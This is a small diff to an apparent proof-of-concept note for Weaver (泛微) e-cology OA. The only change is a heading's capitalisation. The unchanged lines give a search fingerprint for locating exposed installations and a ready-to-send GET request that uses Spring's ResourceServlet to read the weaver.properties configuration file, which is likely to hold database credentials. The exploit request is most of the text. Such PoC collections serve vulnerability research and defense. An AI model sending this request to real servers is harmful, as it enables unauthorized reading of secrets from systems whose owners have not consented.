@@ -5,7 +5,7 @@
 app="泛微-OA(e-cology)"
 ```
 
-## poc
+## POC
 ```
 GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
 ```
